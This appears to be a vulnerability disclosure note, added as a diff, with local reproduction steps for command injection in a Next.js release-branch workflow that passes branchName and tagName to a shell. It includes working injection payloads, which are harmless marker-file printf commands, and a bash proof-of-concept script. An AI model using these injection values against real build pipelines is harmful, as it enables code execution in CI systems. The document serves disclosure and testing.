@@ -1,0 +1,105 @@
+Create Release Branch workflow command injection - local reproduction steps
+
+Scope
+-----
+This reproduction is non-destructive and local-only.
+
+It does not:
+- trigger GitHub Actions
+- use GitHub tokens
+- push branches
+- call the GitHub API
+- modify the Next.js working tree
+
+The goal is only to demonstrate that the vulnerable shell command construction
+can be broken out of when user-controlled branchName/tagName values are passed
+to execa(command, { shell: true }).
+
+
+Affected command shapes
+-----------------------
+The vulnerable script builds shell command strings equivalent to:
+
+  git checkout -b "${branchName}"
+  git fetch origin ${tagName} --tags
+  git reset --hard ${tagName}
+  git push origin "${branchName}"
+
+The issue is that branchName and tagName are inserted into shell strings.
+branchName can close the double quote and append another shell command.
+tagName can append a shell separator directly.
+
+
+Local reproduction
+------------------
+Run these commands from any shell on a machine with bash and git installed:
+
+  rm -f /tmp/nextjs-release-branch-poc /tmp/nextjs-release-tag-poc
+
+  tmpdir="$(mktemp -d)"
+  trap 'rm -rf "$tmpdir"' EXIT
+  cd "$tmpdir"
+
+  git init -q
+  git config user.email poc@example.invalid
+  git config user.name poc
+  printf 'poc\n' > README.md
+  git add README.md
+  git commit -q -m init
+
+  branch_name='next-15-4"; printf VULN_BRANCH_VALIDATED > /tmp/nextjs-release-branch-poc; #'
+  tag_name='v15.4.1; printf VULN_TAG_VALIDATED > /tmp/nextjs-release-tag-poc; #'
+
+  branch_command="git checkout -b \"${branch_name}\""
+  tag_command="git fetch origin ${tag_name} --tags"
+
+  printf 'Simulated branch command:\n%s\n\n' "$branch_command"
+  printf 'Simulated tag command:\n%s\n\n' "$tag_command"
+
+  bash -c "$branch_command" >/tmp/nextjs-release-branch-poc.log 2>&1 || true
+  bash -c "$tag_command" >/tmp/nextjs-release-tag-poc.log 2>&1 || true
+
+  printf 'branchName marker: '
+  cat /tmp/nextjs-release-branch-poc
+  printf '\ntagName marker: '
+  cat /tmp/nextjs-release-tag-poc
+  printf '\n'
+
+
+Expected result
+---------------
+The final output should include:
+
+  branchName marker: VULN_BRANCH_VALIDATED
+  tagName marker: VULN_TAG_VALIDATED
+
+If both marker files are created, the local reproduction confirms that shell
+metacharacters in branchName and tagName can execute additional commands when
+the vulnerable command strings are run through a shell.
+
+
+Why this proves the bug
+-----------------------
+This mirrors the vulnerable sink:
+
+  execa(command, { shell: true })
+
+The first payload closes the quoted branch name, runs printf, and comments out
+the trailing quote:
+
+  next-15-4"; printf VULN_BRANCH_VALIDATED > /tmp/nextjs-release-branch-poc; #
+
+The second payload appends a shell command after the tag name:
+
+  v15.4.1; printf VULN_TAG_VALIDATED > /tmp/nextjs-release-tag-poc; #
+
+The git commands may succeed or fail; the proof is the creation of the marker
+files by injected shell commands.
+
+
+Safe cleanup
+------------
+Remove marker and log files:
+
+  rm -f /tmp/nextjs-release-branch-poc /tmp/nextjs-release-tag-poc
+  rm -f /tmp/nextjs-release-branch-poc.log /tmp/nextjs-release-tag-poc.log
